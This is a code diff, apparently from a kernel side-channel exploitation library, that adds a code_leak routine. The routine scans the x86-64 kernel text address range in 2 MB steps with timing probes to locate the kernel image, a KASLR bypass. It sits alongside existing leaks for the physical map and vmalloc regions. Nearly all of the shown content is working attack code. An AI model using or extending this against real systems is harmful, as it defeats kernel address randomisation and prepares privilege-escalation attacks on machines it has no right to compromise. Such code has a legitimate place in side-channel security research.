@@ -12,6 +12,9 @@
 #include <sys/mman.h>
 #include <string.h>
 
+
+#define CODE_START     0xffffffff80000000
+#define CODE_END       0xffffffffa0000000
 #define IDENTITY_START 0xffff888000000000
 #define IDENTITY_END   0xffffc87fffffffff
 #define VMEMMAP_START  0xffff888800000000
@@ -78,6 +81,30 @@ size_t dpm_leak(size_t tries)
 size_t dpm_leak_found(size_t tries, size_t *found)
 {
     return __dpm_leak(tries, found);
+}
+
+size_t __code_leak(size_t tries, size_t *found)
+{
+    size_t addr;
+    for (addr = CODE_START; addr < CODE_END; addr += (1ULL << 21)) {
+        for (size_t i = 0; i < tries; ++i) {
+            *found = hit(addr, 4) && hit_accurate(addr, 30);
+            if (*found)
+                break;
+        }
+        if (*found)
+            break;
+    }
+    return addr;
+}
+size_t code_leak(size_t tries)
+{
+    size_t found = 0;
+    return __code_leak(tries, &found);
+}
+size_t code_leak_found(size_t tries, size_t *found)
+{
+    return __code_leak(tries, found);
 }
 
 size_t __vmalloc_leak(size_t tries, size_t *found)
